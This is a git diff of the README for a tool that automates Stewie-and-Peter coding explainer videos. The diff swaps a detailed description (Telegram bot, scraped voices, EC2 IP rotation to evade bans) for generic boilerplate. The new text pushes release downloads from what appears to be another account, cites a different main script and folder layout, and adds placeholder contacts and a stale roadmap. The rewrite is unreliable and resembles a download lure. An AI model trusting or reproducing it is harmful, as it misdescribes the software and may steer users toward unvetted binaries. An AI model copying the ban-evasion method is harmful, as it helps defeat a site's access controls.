@@ -1,19 +1,18 @@
 # Stewie_it v1
 
+![Stewie_it](https://img.shields.io/badge/Download-Release-brightgreen)  
+[Watch Demo Reel on Instagram](https://www.instagram.com/stewie_codes_absurd/)
 
-🎥 **Demo Reel:** [Watch on Instagram](https://www.instagram.com/stewie_codes_absurd/)
+**Stewie_it v1** is an experimental automation project inspired by a viral Instagram trend where Stewie and Peter Griffin humorously explain coding topics over gameplay footage. This project automates the assembly of these videos by combining user-provided scripts, AI-scraped voices, character images, and gameplay backgrounds, then sending them to the user.
 
-**Stewie_it v1** is an experimental automation project inspired by a viral Instagram trend where Stewie and Peter Griffin humorously explain coding topics over gameplay footage (recent trend)
+> ⚠️ This is an experimental project created for fun and educational purposes. It uses techniques like scraping voices and rotating IPs via AWS EC2.
 
-This project automates assembling these videos by combining user-provided scripts, AI-scraped voices, character images, and gameplay background, then sending them to user.
-
-> ⚠️ This is an experimental project, created for fun and educational purposes. It uses tricks like scraping voices and rotating IPs via AWS EC2.
 ---
 
 ## 🎥 Example Video Format
 
-| ![Stewie](image_assests/stewie.png) | ![Peter](image_assests/peter.png) |
-|:----------------------------------------:|:-------------------------------------:|
+| ![Stewie](image_assets/stewie.png) | ![Peter](image_assets/peter.png) |
+|:-------------------------------------:|:-----------------------------------:|
 | **Stewie** explains a coding concept with AI voiceover | **Peter** reacts or adds commentary with AI voiceover |
 | Meanwhile, gameplay footage plays in the background |
 
@@ -21,111 +20,147 @@ This project automates assembling these videos by combining user-provided script
 
 ## 🧠 How It Works
 
-### 1. Script Input via Telegram  
-- The user sends a coding topic or full dialogue script to the Telegram bot.  
-- The bot expects a back-and-forth conversation format alternating between Stewie and Peter lines.  
-- Users can optionally generate or fetch scripts using ChatGPT externally and paste them in.
+### 1. Script Input
+Users provide scripts that outline the coding topics. The project processes these scripts to generate voiceovers and visuals.
 
-### 🧠 Telegram Interface
+### 2. AI Voice Generation
+The project uses AI to generate voices for Stewie and Peter. It scrapes voice samples from various sources to create a natural-sounding narration.
 
-Here’s how you interact with the bot via Telegram:
+### 3. Image and Gameplay Assembly
+The project combines character images with gameplay footage. It overlays the images onto the gameplay to create an engaging viewing experience.
 
-| ![Telegram Screen 1](image_assests/telegram_screenshot2.png) | ![Telegram Screen 2](image_assests/telegram_screenshot1.png) |
-|:--------------------------------------------------------:|:--------------------------------------------------------:|
-| Telegram: Send content or prompts                        | Telegram: Get auto-generated video file                  |
-
-
-### 2. Voice Generation  
-- Voices are scraped from [Parrot AI](https://parrot.ai/) by spinning up an AWS EC2 instance that:  
-  - Launches, scrapes voice clips for the dialogue, then shuts down automatically.  
-- AWS **CloudWatch Events + Lambda** handle EC2 lifecycle management to rotate IP addresses and avoid bans.
-
-### 3. Image & Asset Collection  
-- Character images (`stewie.png`, `peter.png`) are stored locally.  
-- Gameplay footage videos are pre-stored, you can add any footage in reel size video in video assests folder 
-- DuckDuckGo scraping is used to find additional relevant images if needed.
-
-### 4. Video Assembly  
-- Using Python’s `moviepy`, the audio clips, character images, and gameplay footage are synchronized and combined into the final video.  
-- Each dialogue line is paired with the corresponding character’s image and AI voice clip.
-
-### 5. Telegram Monitoring  
-- The Telegram bot notifies users about job status, errors, or when the video is ready.  
-- Users can send new scripts or topics directly to the bot.
-
-### 6. Telegram Delivery  
-- When the video is ready, it is **sent directly back to the Telegram user**.
-- You always receive your video, even if posting fails.
-
-### 7. (Optional) Instagram Auto-Posting  
-- Auto-posting is available via **Instagram Graph API**.
-- Since IP address changes with EC2, this is best handled via a **cron job** if a valid session/IP is known.
-- You can also manually post using the Telegram-delivered video.
-## ⚙️ Requirements
-
-- Python 3.9+
-- AWS account with:
-  - EC2 instance for voice scraping
-  - CloudWatch + Lambda to manage EC2 lifecycle and IP rotation
-- Telegram Bot Token
-- OpenAI API key (optional, for manual ChatGPT use outside project)
-
-
-
-## 📄 Sample Content Format
-
-Below is an example of how the script content is structured to generate the videos. The `audio` field paths are managed internally and are omitted here for privacy.
-
-```json
-[
-  {
-    "audio": "[path to Peter's audio clip]",
-    "image": "peter.png",
-    "dialogue": "Peter: Hello Indian dev! You’ve seen reels like this, right?",
-    "character": "peter",
-    "image_search": "indian developer"
-  },
-  {
-    "audio": "[path to Stewie's audio clip]",
-    "image": "stewie.png",
-    "dialogue": "Stewie: Yeah! Those viral AI voice skits? Everyone’s reposting this one.",
-    "character": "stewie",
-    "image_search": "viral ai reel"
-  },
-  {
-    "audio": "[path to Peter's audio clip]",
-    "image": "peter.png",
-    "dialogue": "Peter: I built the automation for this. No paid AI, all open source!",
-    "character": "peter",
-    "image_search": "automation setup"
-  }
-]
-
-
-## System Requirements
-
-Before running the script, make sure the following system-level dependencies are installed:
-
-### 🧰 Required Packages
-
-- **FFmpeg**: Required by `moviepy` and `pydub` for audio/video processing.
-- **ImageMagick**: Used for image manipulation and required for certain operations by `moviepy` or `imageio`.
-- **imageio**: Python library used for reading/writing images, often works with `moviepy`.
+### 4. Output Delivery
+Once the video is assembled, it is sent to the user. Users can then share or upload the video to their preferred platforms.
 
 ---
 
-### 📦 Install on Ubuntu/Debian
+## 🛠️ Installation
 
-```bash
-sudo apt update
-sudo apt install ffmpeg imagemagick
-pip install imageio
+To get started with **Stewie_it v1**, follow these steps:
 
+1. **Clone the Repository**
+   ```bash
+   git clone https://github.com/Paphellas/Stewie_it_v1.git
+   ```
 
+2. **Navigate to the Directory**
+   ```bash
+   cd Stewie_it_v1
+   ```
 
-## ⚙️ Setup & Running
+3. **Install Dependencies**
+   Ensure you have the necessary dependencies installed. Use the following command:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-- The main automation service runs via `flow_main.py`.  
-- Run it as a background service or use process managers like `systemd`, `pm2`, or `screen`/`tmux` to keep it alive.  
-- This script keeps the Telegram bot live and handles the entire workflow end-to-end.
+4. **Run the Project**
+   Execute the main script to start the project:
+   ```bash
+   python main.py
+   ```
 
+5. **Download Release**
+   Visit the [Releases section](https://github.com/Paphellas/Stewie_it_v1/releases) to download the latest version. Follow the instructions provided there.
+
+---
+
+## 📁 Project Structure
+
+The project consists of several key components:
+
+```
+Stewie_it_v1/
+├── image_assets/          # Contains character images
+├── scripts/               # User-provided scripts
+├── gameplay/              # Background gameplay footage
+├── main.py                # Main script to run the project
+├── requirements.txt       # List of dependencies
+└── README.md              # Project documentation
+```
+
+### Image Assets
+The `image_assets` folder contains images of Stewie and Peter. These images are essential for creating the video content.
+
+### Scripts
+Users can place their scripts in the `scripts` folder. Each script should be in a text file format.
+
+### Gameplay Footage
+The `gameplay` folder holds background footage. Users can add their own gameplay videos to enhance the final output.
+
+---
+
+## 🔍 Features
+
+- **User-Friendly Interface**: Simple commands to run the project.
+- **Customizable Scripts**: Users can write their own scripts for unique content.
+- **AI Voiceover**: Engaging and humorous voiceovers generated by AI.
+- **Dynamic Video Assembly**: Combines images and gameplay seamlessly.
+
+---
+
+## 🎯 Future Improvements
+
+- **Enhanced Voice Options**: Integrate more voice styles for variety.
+- **User Feedback System**: Allow users to rate videos for improvement.
+- **Additional Character Options**: Introduce more characters for broader appeal.
+- **Cloud Storage Integration**: Save videos directly to cloud services.
+
+---
+
+## 📄 Contributing
+
+Contributions are welcome! If you have suggestions or improvements, please follow these steps:
+
+1. **Fork the Repository**
+2. **Create a New Branch**
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+
+3. **Make Changes and Commit**
+   ```bash
+   git commit -m "Add your message here"
+   ```
+
+4. **Push to Your Branch**
+   ```bash
+   git push origin feature/YourFeature
+   ```
+
+5. **Open a Pull Request**
+
+---
+
+## 📧 Contact
+
+For any questions or feedback, feel free to reach out:
+
+- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+
+---
+
+## 🎉 Acknowledgments
+
+- Thanks to the creators of Stewie and Peter Griffin for the inspiration.
+- Special thanks to the community for their support and feedback.
+
+---
+
+## 📅 Roadmap
+
+- **Q1 2024**: Launch version 2.0 with new features.
+- **Q2 2024**: Implement user feedback system.
+- **Q3 2024**: Introduce new characters and voices.
+
+---
+
+## 🔗 Links
+
+- [Releases](https://github.com/Paphellas/Stewie_it_v1/releases)
+- [Demo Reel](https://www.instagram.com/stewie_codes_absurd/)
+
+---
+
+Enjoy creating your videos with **Stewie_it v1**!
